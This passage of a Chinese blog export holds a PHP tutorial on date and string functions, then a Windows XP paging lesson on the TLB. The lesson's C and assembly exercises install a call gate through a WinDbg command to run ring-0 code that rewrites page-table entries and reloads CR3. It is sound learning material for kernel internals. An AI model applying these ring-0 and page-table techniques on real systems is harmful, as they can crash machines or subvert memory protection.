class="string">&quot;时 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;hours&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;分 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;minutes&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;秒 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;seconds&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;一个小时中的第几钟 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;minutes&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;这是一分钟的第几秒 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;seconds&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;星期名称 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;weekday&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;月份名称 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;month&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;时间戳   :&quot;</span>.<span class="variable">$mytime</span>[0].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">年 :2019 </span><br><span class="line">月 :2 </span><br><span class="line">日 :17 </span><br><span class="line">时 :5 </span><br><span class="line">分 :39 </span><br><span class="line">秒 :34 </span><br><span class="line">一个小时中的第几钟 :39 </span><br><span class="line">这是一分钟的第几秒 :34 </span><br><span class="line">星期名称 :Sunday </span><br><span class="line">月份名称 :February </span><br><span class="line">时间戳 :1550381974</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>5. 日期验证函数</strong></font><br><font color="red" ><strong>checkdate</strong></font>可以判断一个输出的日期是否有效。<br>在实际的工作中，我们需要经常用于检测常用于用户提交表单的数据验证。<br>例如：<strong>验证用户输入的时间是否正确</strong>。<br>函数的语法格式如下：<br><font color="red" ><strong>bool checkdate ( int $month , int $day , int $year )</strong></font><br></font><br>&amp;emsp;<br><font color="red" ></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(checkdate(<span class="number">12</span>, <span class="number">31</span>, <span class="number">2018</span>));</span><br><span class="line">var_dump(checkdate(<span class="number">2</span>, <span class="number">29</span>, <span class="number">2011</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出结果：</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>6.获取本地化时间戳函数</strong></font> </font><br><strong>mktime()函数、strtotime()函数。</strong><br><font color="#00B2EE" >[注：<a href="http://www.php.cn/code/1116.html">使用方法</a>]</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-5-检测程序执行时间"><a href="#2-5-检测程序执行时间" class="headerlink" title="2.5  检测程序执行时间"></a><font color="#3CB371" face="Comic sans MS">2.5  检测程序执行时间</font></h4><p><font face="Comic sans MS">我们有的时经常需要做程序的执行时间执行效率判断。</font><br>实现的思路如下：<br><font color="red" ></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//记录开始时间</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//记录结整时</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 开始时间  减去（-）  结束时间  得到程序的运行时间</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;<br><font face="Comic sans MS">可是不要忘了，程序的运行速度太快了。快到只有0.00000几秒的一刹那。那这个时候大家要记录一个特函的函数了：</font><br><font color="red" ><strong>mixed microtime ([ bool $get_as_float ] )</strong></font><br><strong>microtime()这个函数，能够返回当前 Unix 时间戳和微秒数。</strong><br><font color="red" ></font></p>
<blockquote>
<p><font color="#FF6347"><strong>参数：</strong><br>如果你传入true的话，将会返回一个浮点类型的时间，这样方便参与运算。</font></p>
</blockquote>
<p>模拟一个检测函数执行时间的例子，测试某个函数效率的快慢：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//开始时间</span><br><span class="line"><span class="variable">$time_start</span> = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">//循环一万次</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = 0 ; <span class="variable">$i</span> &lt; 10000 ; <span class="variable">$i</span>++)&#123;</span><br><span class="line">   //你可以用上，mktime() 生成一个昨天的时间</span><br><span class="line">   //再用strtotime() 生成一个昨天的时间</span><br><span class="line">   //对比两个函数认的效率高</span><br><span class="line">&#125;</span><br><span class="line">//结整时间</span><br><span class="line"><span class="variable">$time_end</span> = microtime(<span class="literal">true</span>);</span><br><span class="line">//相减得到运行时间</span><br><span class="line"><span class="variable">$time</span> = <span class="variable">$time_end</span> - <span class="variable">$time_start</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;这个脚本执行的时间为 <span class="variable">$time</span> seconds\n&quot;</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">这个脚本执行的时间为 0.00016498565673828 seconds</span><br></pre></td></tr></table></figure>

<blockquote>
<p>最后输出的结果就是我们实际的函数的执行时间。你可以多对比几次，看看最终的结果。<br>谁的时间短，在实际的工作中，你就可以经常使用哪个函数。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-6-字符串常用函数"><a href="#2-6-字符串常用函数" class="headerlink" title="2.6  字符串常用函数"></a><font color="#3CB371" face="Comic sans MS">2.6  字符串常用函数</font></h4><p><font color="red"><strong>数组</strong></font>、<font color="red"><strong>字符串</strong></font>和<font color="red"><strong>数据库</strong></font>是我们函数里面最、最、最常用的三类函数。</p>
<p><font face="Comic sans MS">当然PHP的字符串函数也有很多。我们最常使用的两个系列的字符串：<br>    1.单字节字符串处理函数<br>    2.多字节字符串处理函数<br>    3.字符串编码转换函数<br></font></p>
<blockquote>
<p><font color="#FF6347"><strong>我们来说说为什么要学这么多函数：</strong></font><br>    1.我们学的是中文，是双字节或者三字节的。老外的函数只能处理英文和数字这些单字节的字符串处理不鸟中文。达不到我们的功能需求<br>    2.有的时候需要做不同字符编码间的转换，例如：把GBK的转为UTF-8<br>    3.英文这些字符在电脑里又是必须要处理的</p>
</blockquote>
<p>&amp;emsp;</p>
<blockquote>
<p>中文主要用的是GBK和utf-8两种编码格式。<br>GBK和utf-8是两个不同的编码委员会对于汉字进行的编码的标准。<br>他们规定GBK是双字节，也就是一个汉字占用2Bytes。<br>utf-8是三字节，一个汉字占用三个字节长度的存储空间。</p>
</blockquote>
<p>&amp;emsp;<br><font color="#00B2EE">PHP常用函数：</font></p>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">trim()</td>
<td align="left">删除字符串两端的空格或其他预定义字符</td>
<td align="left">“$str &#x3D; “\r\nHello World!\r\n”; echo trim($str);</td>
</tr>
<tr>
<td align="center">rtrim()</td>
<td align="left">删除字符串右边的空格或其他预定义字符</td>
<td align="left">“$str &#x3D; “Hello World!\n\n”; echo rtrim($str);”</td>
</tr>
<tr>
<td align="center">chop()</td>
<td align="left">rtrim()的别名</td>
<td align="left">同上</td>
</tr>
<tr>
<td align="center">ltrim()</td>
<td align="left">删除字符串左边的空格或其他预定义字符</td>
<td align="left">“$str &#x3D; “\r\nHello World!”; echo ltrim($str);”</td>
</tr>
<tr>
<td align="center">dirname()</td>
<td align="left">回路径中的目录部分（我们把它归在了字符串函数里了）</td>
<td align="left">echo dirname(“c:&#x2F;testweb&#x2F;home.php”);</td>
</tr>
<tr>
<td align="center">str_pad()</td>
<td align="left">把字符串填充为指定的长度</td>
<td align="left">$str &#x3D; “Hello World”; echo str_pad($str,20,”.”);</td>
</tr>
<tr>
<td align="center">str_repeat()</td>
<td align="left">重复使用指定字符串</td>
<td align="left">echo str_repeat(“.”,13);</td>
</tr>
<tr>
<td align="center">str_split()</td>
<td align="left">把字符串分割到数组中</td>
<td align="left">print_r(str_split(“Hello”));</td>
</tr>
<tr>
<td align="center">strrev()</td>
<td align="left">反转字符串</td>
<td align="left">echo strrev(“Hello World!”);</td>
</tr>
<tr>
<td align="center">wordwrap()</td>
<td align="left">按照指定长度对字符串进行折行处理</td>
<td align="left">“$str &#x3D; “”An example on a long word is: Supercalifragulistic””; echo wordwrap($str,15);”</td>
</tr>
<tr>
<td align="center">str_shuffle()</td>
<td align="left">随机地打乱字符串中所有字符</td>
<td align="left">echo str_shuffle(“Hello World”);</td>
</tr>
<tr>
<td align="center">parse_str()</td>
<td align="left">将字符串解析成变量</td>
<td align="left">“parse_str(“id&#x3D;23&amp;name&#x3D;John%20Adams”,$myArray); print_r($myArray);”</td>
</tr>
<tr>
<td align="center">number_format()</td>
<td align="left">通过千位分组来格式化数字</td>
<td align="left">“echo number_format(“1000000”); echo number_format(“1000000”,2); echo number_format(“1000000”,2,””,””,””.””);”</td>
</tr>
<tr>
<td align="center">strtolower()</td>
<td align="left">字符串转为小写</td>
<td align="left">echo strtolower(“Hello WORLD!”);</td>
</tr>
<tr>
<td align="center">strtoupper()</td>
<td align="left">字符串转为大写</td>
<td align="left">echo strtoupper(“Hello WORLD!”);</td>
</tr>
<tr>
<td align="center">ucfirst()</td>
<td align="left">字符串首字母大写</td>
<td align="left">echo ucfirst(“hello world”);</td>
</tr>
<tr>
<td align="center">ucwords()</td>
<td align="left">字符串每个单词首字符转为大写</td>
<td align="left">echo ucwords(“hello world”);</td>
</tr>
<tr>
<td align="center">htmlentities()</td>
<td align="left">把字符转为HTML实体</td>
<td align="left">$str &#x3D; “”John &amp; ‘Adams’””; echo htmlentities($str, ENT_COMPAT);</td>
</tr>
<tr>
<td align="center">htmlspecialchars()</td>
<td align="left">预定义字符转html编码</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">nl2br()</td>
<td align="left">\n转义为标签</td>
<td align="left">echo nl2br(“One line.\nAnother line.”);</td>
</tr>
<tr>
<td align="center">strip_tags()</td>
<td align="left">剥去 HTML、XML 以及 PHP 的标签</td>
<td align="left">echo strip_tags(“Hello world!”);</td>
</tr>
<tr>
<td align="center">addcslashes()</td>
<td align="left">在指定的字符前添加反斜线转义字符串中字符</td>
<td align="left">$str &#x3D; “”Hello, my name is John Adams.” echo $str; echo addcslashes($str,’m’);”</td>
</tr>
<tr>
<td align="center">stripcslashes()</td>
<td align="left">删除由addcslashes()添加的反斜线</td>
<td align="left">echo stripcslashes(“Hello, \my na\me is Kai Ji\m.”);</td>
</tr>
<tr>
<td align="center">addslashes()</td>
<td align="left">指定预定义字符前添加反斜线</td>
<td align="left">$str &#x3D; “Who’s John Adams?”;echo addslashes($str);</td>
</tr>
<tr>
<td align="center">stripslashes()</td>
<td align="left">删除由addslashes()添加的转义字符</td>
<td align="left">echo stripslashes(“Who&#39;s John Adams?”);</td>
</tr>
<tr>
<td align="center">quotemeta()</td>
<td align="left">在字符串中某些预定义的字符前添加反斜线</td>
<td align="left">$str &#x3D; “Hello world. (can you hear me?)”; echo quotemeta($str);</td>
</tr>
<tr>
<td align="center">chr()</td>
<td align="left">从指定的 ASCII 值返回字符</td>
<td align="left">echo chr(052);</td>
</tr>
<tr>
<td align="center">ord()</td>
<td align="left">返回字符串第一个字符的 ASCII值</td>
<td align="left">echo ord(“hello”);</td>
</tr>
<tr>
<td align="center">strcasecmp()</td>
<td align="left">不区分大小写比较两字符串</td>
<td align="left">echo strcasecmp(“Hello world!”,”HELLO WORLD!”);</td>
</tr>
<tr>
<td align="center">strcmp()</td>
<td align="left">区分大小写比较两字符串</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">strncmp()</td>
<td align="left">比较字符串前n个字符,区分大小写</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">strncasecmp()</td>
<td align="left">比较字符串前n个字符,不区分大小写</td>
<td align="left">int strncasecmp ( string $str1 , string $str2 , int $len )</td>
</tr>
<tr>
<td align="center">strnatcmp()</td>
<td align="left">自然顺序法比较字符串长度,区分大小写</td>
<td align="left">int strnatcmp ( string $str1 , string $str2 )</td>
</tr>
<tr>
<td align="center">strnatcasecmp()</td>
<td align="left">自然顺序法比较字符串长度,不区分大小写</td>
<td align="left">int strnatcasecmp ( string $str1 , string $str2 )</td>
</tr>
<tr>
<td align="center">chunk_split()</td>
<td align="left">将字符串分成小块</td>
<td align="left">str chunk_split(str $body[,int $len[,str $end]])</td>
</tr>
<tr>
<td align="center">strtok()</td>
<td align="left">切开字符串</td>
<td align="left">str strtok(str $str,str $token)</td>
</tr>
<tr>
<td align="center">explode()</td>
<td align="left">使用一个字符串为标志分割另一个字符串</td>
<td align="left">array explode(str $sep,str $str[,int $limit])</td>
</tr>
<tr>
<td align="center">implode()</td>
<td align="left">同join,将数组值用预订字符连接成字符串</td>
<td align="left">string implode ( string $glue , array $pieces )</td>
</tr>
<tr>
<td align="center">substr()</td>
<td align="left">截取字符串</td>
<td align="left">string substr ( string $string , int $start [, int $length ] )</td>
</tr>
<tr>
<td align="center">str_replace()</td>
<td align="left">字符串替换操作,区分大小写</td>
<td align="left">mix str_replace(mix $search,,mix $replace,mix $subject[,int &amp;$num])</td>
</tr>
<tr>
<td align="center">str_ireplace()</td>
<td align="left">字符串替换操作,不区分大小写</td>
<td align="left">mix str_ireplace ( mix $search , mix $replace , mix $subject [, int &amp;$count ] )</td>
</tr>
<tr>
<td align="center">substr_count()</td>
<td align="left">统计一个字符串,在另一个字符串中出现次数</td>
<td align="left">int substr_count ( string $haystack , string $needle [, int $offset &#x3D; 0 [, int $length ]] )</td>
</tr>
<tr>
<td align="center">substr_replace()</td>
<td align="left">替换字符串中某串为另一个字符串</td>
<td align="left">mixed substr_replace ( mixed $string , string $replacement , int $start [, int $length ] )</td>
</tr>
<tr>
<td align="center">similar_text()</td>
<td align="left">返回两字符串相同字符的数量</td>
<td align="left">int similar_text(str $str1,str $str2)</td>
</tr>
<tr>
<td align="center">strchr()</td>
<td align="left">返回一个字符串在另一个字符串中开始位置到结束的字符串</td>
<td align="left">string strstr ( string $str, string $needle , bool $before_needle )</td>
</tr>
<tr>
<td align="center">strrchr()</td>
<td align="left">返回一个字符串在另一个字符串中最后一次出现位置开始到末尾的字符串</td>
<td align="left">string strrchr ( string $haystack , mixed $needle )</td>
</tr>
<tr>
<td align="center">stristr()</td>
<td align="left">返回一个字符串在另一个字符串中开始位置到结束的字符串，不区分大小写</td>
<td align="left">string stristr ( string $haystack , mixed $needle [, bool $before_needle &#x3D; false ] )</td>
</tr>
<tr>
<td align="center">strtr()</td>
<td align="left">转换字符串中的某些字符</td>
<td align="left">string strtr ( string $str , string $from , string $to )</td>
</tr>
<tr>
<td align="center">strpos()</td>
<td align="left">寻找字符串中某字符最先出现的位置</td>
<td align="left">int strpos ( string $haystack , mixed $needle [, int $offset &#x3D; 0 ] )</td>
</tr>
<tr>
<td align="center">stripos()</td>
<td align="left">寻找字符串中某字符最先出现的位置,不区分大小写</td>
<td align="left">int stripos ( string $haystack , string $needle [, int $offset ] )</td>
</tr>
<tr>
<td align="center">strrpos()</td>
<td align="left">寻找某字符串中某字符最后出现的位置</td>
<td align="left">int strrpos ( string $haystack , string $needle [, int $offset &#x3D; 0 ] )</td>
</tr>
<tr>
<td align="center">strripos()</td>
<td align="left">寻找某字符串中某字符最后出现的位置,不区分大小写</td>
<td align="left">int strripos ( string $haystack , string $needle [, int $offset ] )</td>
</tr>
<tr>
<td align="center">strspn()</td>
<td align="left">返回字符串中首次符合mask的子字符串长度</td>
<td align="left">int strspn ( string $str1 , string $str2 [, int $start [, int $length ]] )</td>
</tr>
<tr>
<td align="center">strcspn()</td>
<td align="left">返回字符串中不符合mask的字符串的长度</td>
<td align="left">int strcspn ( string $str1 , string $str2 [, int $start [, int $length ]] )</td>
</tr>
<tr>
<td align="center">str_word_count()</td>
<td align="left">统计字符串含有的单词数</td>
<td align="left">mix str_word_count(str $str,[])</td>
</tr>
<tr>
<td align="center">strlen()</td>
<td align="left">统计字符串长度</td>
<td align="left">int strlen(str $str)</td>
</tr>
<tr>
<td align="center">count_chars()</td>
<td align="left">统计字符串中所有字母出现次数(0..255)</td>
<td align="left">mixed count_chars ( string $string [, int $mode ] )</td>
</tr>
<tr>
<td align="center">md5()</td>
<td align="left">字符串md5编码</td>
<td align="left">$str &#x3D; “Hello”; echo md5($str)</td>
</tr>
<tr>
<td align="center"><font color="red"><strong>iconv：</strong></font></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="center">mb_substr</td>
<td align="left">获取字符串的部分</td>
<td align="left">string mb_substr ( string $str , int $start [, int $length &#x3D; NULL [, string $encoding &#x3D; mb_internal_encoding() ]] )</td>
</tr>
<tr>
<td align="center">mb_http_output</td>
<td align="left">设置&#x2F;获取 HTTP 输出字符编码</td>
<td align="left">mixed mb_http_output ([ string $encoding &#x3D; mb_http_output() ] )</td>
</tr>
<tr>
<td align="center">mb_strlen</td>
<td align="left">获取字符串的长度</td>
<td align="left">mixed mb_strlen ( string $str [, string $encoding &#x3D; mb_internal_encoding() ] )</td>
</tr>
<tr>
<td align="center">iconv</td>
<td align="left">字符串按要求的字符编码来转换</td>
<td align="left">string iconv ( string $in_charset , string $out_charset , string $str )</td>
</tr>
<tr>
<td align="center">iconv_substr</td>
<td align="left">截取字符串的部分</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">iconv_get_encoding</td>
<td align="left">获取 iconv 扩展的内部配置变量</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">mb_substr_count</td>
<td align="left">统计字符串出现的次数</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">mb_check_encoding</td>
<td align="left">检查字符串在指定的编码里是否有效</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">mb_strrpos</td>
<td align="left">查找字符串在一个字符串中最后出现的位置</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">mb_split</td>
<td align="left">使用正则表达式分割多字节字符串</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">parse_url</td>
<td align="left">解释URL成为一个数组</td>
<td align="left"></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 页保护（三）</title>
    <url>/post/WinXP-ProtectionMode-Page3/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-TLB"><a href="#1-TLB" class="headerlink" title="1 TLB"></a>1 TLB</h2><h3 id="1-1-TLB结构"><a href="#1-1-TLB结构" class="headerlink" title="1.1 TLB结构"></a>1.1 TLB结构</h3><p>当程序访问一个线性地址，需要先查PDPT，然后查PDT，然后查页表PTT，最后才是访问物理页。这期间多次访问内存，效率非常低。于是TLB就被设计出来了。（<a href="https://zhuanlan.zhihu.com/p/108425561">64位CPU分页及TLB请点这儿</a>）</p>
<p>TLB（Translation Lookaside Buffer），也叫<strong>快表</strong>。TLB 表<strong>在CPU内部</strong>，一个CPU有一张TLB表，用来缓存线性地址和物理地址的映射关系，以及属性和访问次数。（实际上缓存的线性地址、物理地址为<mark class="label danger">页基地址</mark>）</p>
<p><img data-src="https://s2.loli.net/2022/01/06/2fU8YBRA6mJ9Sqe.png" alt="37.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/06/8JXZN1HGzQkmKui.png" alt="38.png"></p>
<ul>
<li>LA：存储的是线性地址所在<strong>页基地址</strong>。</li>
<li>PA：线性地址所在对应的<strong>物理页基址</strong>。</li>
<li>ATTR：属性，除了G、XD位属性为<strong>OR</strong>外，其余的位的属性为<strong>AND</strong>。</li>
<li>LRU：统计这个线性地址的读写情况的，这是因为TLB这个表在CPU内部，那么他就不会很大，当线性地址存储满了的时候，他就会看LRU的统计情况，把读写的次数比较少的项删除，然后再把新的线性地址项添上。</li>
</ul>
<div class="note danger"><p>关于TLB表：</p>
<ol>
<li><strong>TLB是受PDE和PTE中的G位影响的</strong>，PDE中的G位又受PS位影响，且G位属性：<mark class="label success">PDE_G || PTE_G</mark>。</li>
<li>不同的CPU这个TLB表的大小不一样，能存几十项或者几百项。</li>
<li>只要CR3寄存器被重写，<strong>哪怕重新写的值和原来的相同</strong>，<strong>TLB立马刷新</strong>。一核一套TLB。</li>
<li>操作系统的<strong>高2G映射基本不变</strong>，如果CR3被重写了，TLB刷新，重建高2G以上很浪费。故高2G的线性地址对应的物理页的G位常为1（全局页）。<br>所以PDE和PTE中有个G标志位：<ul>
<li>G &#x3D; 1，刷新TLB时将不会刷新PDE&#x2F;PTE的G位为1的页。</li>
<li>当TLB满了，根据统计信息将不常用的地址废弃，最近最常用的保留.</li>
</ul>
</li>
</ol>
</div>

<p>TLB在X86体系的CPU里的实际应用最早是从Intel的486CPU开始的，在X86体系的CPU里边，一般都设有如下4组TLB：<br>第一组：缓存一般页表（4K字节页面）的指令页表缓存（Instruction-TLB）；<br>第二组：缓存一般页表（4K字节页面）的数据页表缓存（Data-TLB）；<br>第三组：缓存大尺寸页表（2M&#x2F;4M字节页面）的指令页表缓存（Instruction-TLB）；<br>第四组：缓存大尺寸页表（2M&#x2F;4M字节页面）的数据页表缓存（Data-TLB）</p>
<h3 id="1-2-练习：体验TLB的存在"><a href="#1-2-练习：体验TLB的存在" class="headerlink" title="1.2 练习：体验TLB的存在"></a>1.2 练习：体验TLB的存在</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD TempVal;</span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Function()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd		</span><br><span class="line">		<span class="comment">// 1.给NULL挂物理页（修改PTE，这里概率蓝屏）0x01234867(G=0) 0x01234967(G=1)</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x01234867</span></span><br><span class="line">		<span class="comment">// 2.写NULL指针，生成TLB记录</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0</span>],<span class="number">0x12345678</span></span><br><span class="line">		<span class="comment">// 3.再次修改物理页</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x02345867</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 4.模拟进程切换</span></span><br><span class="line">		<span class="comment">//mov eax,cr3</span></span><br><span class="line">		<span class="comment">//mov cr3,eax</span></span><br><span class="line">      </span><br><span class="line">		<span class="comment">//清空NULL的TLB缓存</span></span><br><span class="line">		<span class="comment">//INVLPG dword ptr ds:[0]</span></span><br><span class="line">		<span class="comment">// 4.读NULL，未能读取到 0x01234867，证明TLB已被刷新</span></span><br><span class="line">		mov eax,dword ptr ds:[<span class="number">0</span>]</span><br><span class="line">		mov TempVal,eax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad		</span><br><span class="line">		retf</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	BYTE CallGate[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %04xec00`0008%04x\n&quot;</span>, ((DWORD)R0Function&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x0000FFFF</span>,\</span><br><span class="line">         (DWORD)R0Function &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  </span><br><span class="line">	getchar();</span><br><span class="line">	__asm</span><br><span class="line">	  &#123;</span><br><span class="line">		call fword ptr ds:[CallGate];</span><br><span class="line">	  &#125;</span><br><span class="line">	</span><br><span class="line">	PDWORD p = (PDWORD)<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;TempVal的值为：%x\n&quot;</span>,TempVal);<span class="comment">//读</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线性地址NULL中的值为：%x\n&quot;</span>,*p);<span class="comment">//读 </span></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/08/dE8AFSrNIiUXKTV.png" alt="40.png"></p>
<p><strong>结论：</strong>修改一次NULL的PTE，PTE_G  &#x3D; 0后，再继续修改一次NULL的PTE，结果第一次从NULL地址读出来的值是第一次的赋值。说明TLB是存在的。</p>
<div class="note danger"><p><strong>结论：</strong>PTE的G位为0的情况下，凡是涉及修改PTE，要想使修改后的值立即生效，必须使用INVLPG指令，否则由于存在TLB的缘故，修改PTE后第一次再读原地址的值会从TLB中取</p>
</div>

<h3 id="1-3-练习：PTE-G、切换CR3对TLB的影响"><a href="#1-3-练习：PTE-G、切换CR3对TLB的影响" class="headerlink" title="1.3 练习：PTE_G、切换CR3对TLB的影响"></a>1.3 练习：PTE_G、切换CR3对TLB的影响</h3><p>从上一个练习可知，因为TLB的存在，修改PTE后读内存<strong>会</strong>存在“误差”。</p>
<p>但是TLB会受PTE_G值和切换CR3所影响，具体表现为：<strong>修改CR3的值后，PTE_G &#x3D; 1的TLB缓存不会被清理，PTE_G &#x3D; 0的TLB缓存会被清理</strong>。</p>
<div class="note danger"><p><strong>结论：</strong>PTE的G位为0的情况下，凡是涉及修改PTE，要想使修改后的值立即生效，必须使用INVLPG指令，否则由于存在TLB的缘故，修改PTE后第一次再读原地址的值会从TLB中取</p>
</div>

<p>示例1：NULL的PTE_G &#x3D; 0，修改CR3的值，PTE_G &#x3D; 0指向的物理页记录的TLB会被刷新，读内存<strong>不</strong>存在“误差”。</p>
<p><code>mov dword ptr ds:[0xc0000000],0x01234867</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD TempVal;</span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Function()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd		</span><br><span class="line">		<span class="comment">// 1.给NULL挂物理页（修改PTE，这里概率蓝屏）0x01234867(G=0) 0x01234967(G=1)</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x01234867</span></span><br><span class="line">		<span class="comment">// 2.写NULL指针，生成TLB记录</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0</span>],<span class="number">0x12345678</span></span><br><span class="line">		<span class="comment">// 3.再次修改物理页</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x02345867</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 4.模拟进程切换</span></span><br><span class="line">		mov eax,cr3</span><br><span class="line">		mov cr3,eax</span><br><span class="line">      </span><br><span class="line">		<span class="comment">//清空NULL的TLB缓存</span></span><br><span class="line">		<span class="comment">//INVLPG dword ptr ds:[0]</span></span><br><span class="line">		<span class="comment">// 4.读NULL，未能读取到 0x01234867，证明TLB已被刷新</span></span><br><span class="line">		mov eax,dword ptr ds:[<span class="number">0</span>]</span><br><span class="line">		mov TempVal,eax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad		</span><br><span class="line">		retf</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	BYTE CallGate[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %04xec00`0008%04x\n&quot;</span>, ((DWORD)R0Function&gt;&gt;<span class="number">16</span>) &amp; <span 